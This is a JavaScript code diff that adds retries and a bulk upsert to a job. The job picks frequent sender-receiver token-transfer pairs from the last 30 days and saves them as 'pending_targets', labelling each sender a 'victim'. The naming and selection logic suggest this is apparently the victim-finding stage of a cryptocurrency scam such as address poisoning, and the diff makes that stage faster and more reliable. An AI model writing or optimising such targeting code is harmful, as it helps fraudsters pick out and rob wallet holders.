@@ -42,6 +42,7 @@ const BLOCKS_30_DAYS = BLOCKS_30_DAYS_MAP[chainName] || 216000n;
 
 let isFetching = false;
 
+// Robust retry wrapper for network/DB resilience
 async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
   let lastError;
   for (let attempt = 1; attempt <= maxAttempts; attempt++) {
@@ -72,15 +73,20 @@ async function fetchPendingTargets() {
   try {
     logger.info('Fetching qualified pairs (frequency >= 7, last tx within 30 days)...');
 
-    // 1. Get the max block number for this chain
-    const { data: maxBlockData, error: maxBlockError } = await supabase
-      .from('token_transfers')
-      .select('block_number')
-      .eq('chain_id', chainId)
-      .order('block_number', { ascending: false })
-      .limit(1);
+    // 1. Get the max block number for this chain (using retry)
+    const maxBlockData = await withRetry(async () => {
+      const { data, error } = await supabase
+        .from('token_transfers')
+        .select('block_number')
+        .eq('chain_id', chainId)
+        .order('block_number', { ascending: false })
+        .limit(1);
 
-    if (maxBlockError || !maxBlockData || maxBlockData.length === 0) {
+      if (error) throw error;
+      return data;
+    }, 'GetMaxBlock');
+
+    if (!maxBlockData || maxBlockData.length === 0) {
       logger.info('No transfers found in database for this chain yet.');
       return;
     }
@@ -92,17 +98,17 @@ async function fetchPendingTargets() {
 
     logger.info(`Threshold block for 30-day window: ${thresholdBlock} (max block: ${maxBlock})`);
 
-    // 2. Call the SQL function via RPC
-    const { data: rows, error: rpcError } = await supabase
-      .rpc('fetch_pending_targets', {
-        chain_id_param: chainId,
-        threshold_block: thresholdBlock,
-      });
+    // 2. Call the SQL function via RPC (using retry)
+    const rows = await withRetry(async () => {
+      const { data, error } = await supabase
+        .rpc('fetch_pending_targets', {
+          chain_id_param: chainId,
+          threshold_block: thresholdBlock,
+        });
 
-    if (rpcError) {
-      logger.error(`RPC error: ${rpcError.message}`);
-      return;
-    }
+      if (error) throw error;
+      return data;
+    }, 'FetchPendingTargetsRPC');
 
     if (!rows || rows.length === 0) {
       logger.info('No qualified pairs found in this run.');
@@ -111,29 +117,27 @@ async function fetchPendingTargets() {
 
     logger.info(`Found ${rows.length} qualified pairs from RPC.`);
 
-    // 3. Insert new pairs into pending_targets (unique constraint will ignore duplicates)
-    let insertedCount = 0;
-    for (const row of rows) {
-      const cp = row.receiver.toLowerCase();
-      const v = row.sender.toLowerCase();
-      try {
-        const { error } = await supabase
-          .from('pending_targets')
-          .insert({
-            chain: chainName,
-            counterparty: cp,
-            victim: v,
-            processed: false,
-          });
-        if (error && error.code !== '23505') { // unique violation
-          logger.error(`Failed to insert pair ${cp}|${v}: ${error.message}`);
-        } else if (!error) {
-          insertedCount++;
-        }
-      } catch (err) {
-        logger.error(`Error inserting pair: ${err.message}`);
-      }
-    }
+    // 3. Prepare data for dynamic bulk insert
+    const insertData = rows.map((row) => ({
+      chain: chainName,
+      counterparty: row.receiver.toLowerCase(),
+      victim: row.sender.toLowerCase(),
+      processed: false,
+    }));
+
+    // 4. Perform a high-speed bulk upsert (Single DB Roundtrip!)
+    const insertedCount = await withRetry(async () => {
+      const { data, error } = await supabase
+        .from('pending_targets')
+        .upsert(insertData, {
+          onConflict: 'chain,counterparty,victim', // Matches your composite unique constraint
+          ignoreDuplicates: true,                  // Ignores conflicts (ON CONFLICT DO NOTHING)
+        })
+        .select(); // Returns only the newly inserted records
+
+      if (error) throw error;
+      return data ? data.length : 0;
+    }, 'BulkUpsertTargets');
 
     logger.info(`Added ${insertedCount} new qualified pairs to pending_targets.`);
 
